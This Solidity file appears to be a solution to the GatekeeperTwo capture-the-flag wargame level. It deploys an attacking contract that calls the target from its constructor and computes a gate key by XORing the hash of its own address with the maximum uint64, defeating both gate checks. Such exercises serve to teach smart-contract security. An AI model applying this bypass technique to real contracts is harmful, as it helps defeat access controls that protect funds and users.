// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
  function enter(bytes8 _gateKey) external returns (bool);
}

contract AttackGatekeeperTwo{
  constructor(address _gatekeepertwoAddress){
    IGatekeeperTwo gatekeepertwo = IGatekeeperTwo(_gatekeepertwoAddress);
    bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max); 
    gatekeepertwo.enter(_gateKey);
  }
}